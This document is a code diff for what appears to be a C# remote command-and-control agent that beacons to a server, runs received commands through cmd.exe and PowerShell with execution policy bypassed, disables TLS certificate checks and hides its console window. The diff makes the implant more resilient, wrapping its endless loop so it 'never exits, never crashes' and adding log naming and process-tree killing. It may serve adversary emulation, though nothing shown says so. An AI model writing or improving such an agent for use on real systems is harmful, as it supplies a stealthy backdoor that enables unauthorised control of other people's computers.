@@ -15,15 +15,36 @@ class Agent
     static string executors = "cmd,psh,pwsh";
     static int sleep = 5;
     static int timeout = 30;  // Command execution timeout in seconds
-    static string logFile = "debug.log";
+    static string logFile = null;  // Will be set to exe name + .log
 
     static void Log(string msg)
     {
-        File.AppendAllText(logFile, DateTime.Now.ToString("HH:mm:ss") + " " + msg + "\n");
+        try
+        {
+            if (logFile != null)
+                File.AppendAllText(logFile, DateTime.Now.ToString("HH:mm:ss") + " " + msg + "\n");
+        }
+        catch { } // Never fail on logging
     }
 
     static void Main(string[] args)
     {
+        // Set log file based on exe name FIRST (before any logging)
+        try
+        {
+            var exePath = Process.GetCurrentProcess().MainModule.FileName;
+            var exeName = Path.GetFileNameWithoutExtension(exePath);
+            var exeDir = Path.GetDirectoryName(exePath);
+            logFile = Path.Combine(exeDir, exeName + ".log");
+        }
+        catch
+        {
+            logFile = "agent.log"; // Fallback
+        }
+        
+        Log("=== AGENT STARTING ===");
+        Log("Log file: " + logFile);
+        
         // Log all received arguments
         Log("Total args: " + args.Length);
         for (int i = 0; i < args.Length; i++)
@@ -57,37 +78,62 @@ class Agent
         }
 
         // PAW = exe name without extension (simple and immutable)
-        paw = Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName);
+        try
+        {
+            paw = Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName);
+        }
+        catch
+        {
+            paw = "agent-" + new Random().Next(1000, 9999);
+        }
         Log("PAW set to exe name: " + paw);
         
-        Log("Agent starting with server=" + server);
-        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
-        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+        Log("Agent starting with server=" + server + ", timeout=" + timeout + "s");
+        try
+        {
+            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+        }
+        catch { }
         Log("TLS configured");
         
         try { Console.WindowHeight = 1; Console.WindowWidth = 1; } catch {}
         Log("Console hidden");
         
+        // MAIN LOOP - NEVER EXITS, NEVER CRASHES
         while (true)
         {
             try
             {
                 Log("Loop iteration - paw=" + (paw ?? "null"));
-                Beacon();
-                Thread.Sleep(sleep * 1000);
+                SafeBeacon();
             }
             catch (Exception ex)
             { 
-                Log("ERROR: " + ex.Message);
-                Log("Stack: " + ex.StackTrace);
-                Thread.Sleep(30000);
+                Log("[MAIN-LOOP-ERROR] " + ex.Message);
             }
+            
+            // Always sleep, even after errors
+            try { Thread.Sleep(sleep * 1000); } catch { Thread.Sleep(5000); }
+        }
+    }
+
+    static void SafeBeacon()
+    {
+        try
+        {
+            Beacon();
+        }
+        catch (Exception ex)
+        {
+            Log("[BEACON-ERROR] " + ex.Message);
         }
     }
 
     static void Beacon()
     {
-        var proc = Process.GetCurrentProcess();
+        Process proc = null;
+        try { proc = Process.GetCurrentProcess(); } catch { }
         
         // PAW = exe name without extension (always sent, never changes)
         var json = "{" +
@@ -347,82 +393,123 @@ class Agent
 
     static string RunCmd(string command)
     {
-        var proc = new Process
+        try
         {
-            StartInfo = new ProcessStartInfo
+            Log("[CMD] Executing: " + command.Substring(0, Math.Min(80, command.Length)) + (command.Length > 80 ? "..." : ""));
+            
+            var proc = new Process
             {
-                FileName = "cmd.exe",
-                Arguments = "/c " + command,
-                UseShellExecute = false,
-                RedirectStandardOutput = true,
-                RedirectStandardError = true,
-                CreateNoWindow = true
-            }
-        };
-        proc.Start();
-        
-        // Wait with timeout
-        bool completed = proc.WaitForExit(timeout * 1000);
-        
-        string output = "";
-        if (completed)
-        {
-            output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
-        }
-        else
-        {
-            // Kill the process if timeout exceeded
-            try
+                StartInfo = new ProcessStartInfo
+                {
+                    FileName = "cmd.exe",
+                    Arguments = "/c " + command,
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    CreateNoWindow = true
+                }
+            };
+            
+            proc.Start();
+            
+            // Wait with timeout
+            bool completed = proc.WaitForExit(timeout * 1000);
+            
+            string output = "";
+            if (completed)
             {
-                proc.Kill();
-                proc.WaitForExit(1000); // Give it 1 second to die
+                try { output = proc.StandardOutput.ReadToEnd(); } catch { }
+                try { output += proc.StandardError.ReadToEnd(); } catch { }
+                Log("[CMD] Completed, output length: " + output.Length);
             }
-            catch { }
-            output = $"[TIMEOUT] Command killed after {timeout} seconds";
-            Log($"[TIMEOUT] cmd.exe killed after {timeout}s: {command.Substring(0, Math.Min(50, command.Length))}...");
+            else
+            {
+                // Kill the process tree if timeout exceeded
+                Log($"[CMD-TIMEOUT] Killing after {timeout}s");
+                try { KillProcessTree(proc.Id); } catch { }
+                try { proc.Kill(); } catch { }
+                output = $"[TIMEOUT] Command killed after {timeout} seconds. Command: {command.Substring(0, Math.Min(100, command.Length))}";
+            }
+            
+            return output;
         }
-        
-        return output;
+        catch (Exception ex)
+        {
+            Log("[CMD-ERROR] " + ex.Message);
+            return "[ERROR] " + ex.Message;
+        }
     }
 
     static string RunPowerShell(string command)
     {
-        var proc = new Process
+        try
         {
-            StartInfo = new ProcessStartInfo
+            Log("[PSH] Executing: " + command.Substring(0, Math.Min(80, command.Length)) + (command.Length > 80 ? "..." : ""));
+            
+            var proc = new Process
             {
-                FileName = "powershell.exe",
-                Arguments = "-NoProfile -ExecutionPolicy Bypass -Command " + command,
-                UseShellExecute = false,
-                RedirectStandardOutput = true,
-                RedirectStandardError = true,
-                CreateNoWindow = true
-            }
-        };
-        proc.Start();
-        
-        // Wait with timeout
-        bool completed = proc.WaitForExit(timeout * 1000);
-        
-        string output = "";
-        if (completed)
-        {
-            output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
-        }
-        else
-        {
-            // Kill the process if timeout exceeded
-            try
+                StartInfo = new ProcessStartInfo
+                {
+                    FileName = "powershell.exe",
+                    Arguments = "-NoProfile -ExecutionPolicy Bypass -Command " + command,
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    CreateNoWindow = true
+                }
+            };
+            
+            proc.Start();
+            
+            // Wait with timeout
+            bool completed = proc.WaitForExit(timeout * 1000);
+            
+            string output = "";
+            if (completed)
             {
-                proc.Kill();
-                proc.WaitForExit(1000); // Give it 1 second to die
+                try { output = proc.StandardOutput.ReadToEnd(); } catch { }
+                try { output += proc.StandardError.ReadToEnd(); } catch { }
+                Log("[PSH] Completed, output length: " + output.Length);
             }
-            catch { }
-            output = $"[TIMEOUT] Command killed after {timeout} seconds";
-            Log($"[TIMEOUT] powershell.exe killed after {timeout}s: {command.Substring(0, Math.Min(50, command.Length))}...");
+            else
+            {
+                // Kill the process tree if timeout exceeded
+                Log($"[PSH-TIMEOUT] Killing after {timeout}s");
+                try { KillProcessTree(proc.Id); } catch { }
+                try { proc.Kill(); } catch { }
+                output = $"[TIMEOUT] Command killed after {timeout} seconds. Command: {command.Substring(0, Math.Min(100, command.Length))}";
+            }
+            
+            return output;
         }
-        
-        return output;
+        catch (Exception ex)
+        {
+            Log("[PSH-ERROR] " + ex.Message);
+            return "[ERROR] " + ex.Message;
+        }
+    }
+
+    static void KillProcessTree(int pid)
+    {
+        try
+        {
+            // Use taskkill to kill the process tree
+            var killProc = new Process
+            {
+                StartInfo = new ProcessStartInfo
+                {
+                    FileName = "taskkill",
+                    Arguments = $"/F /T /PID {pid}",
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    CreateNoWindow = true
+                }
+            };
+            killProc.Start();
+            killProc.WaitForExit(5000);
+        }
+        catch { }
     }
 
     static string Post(string endpoint, byte[] data)
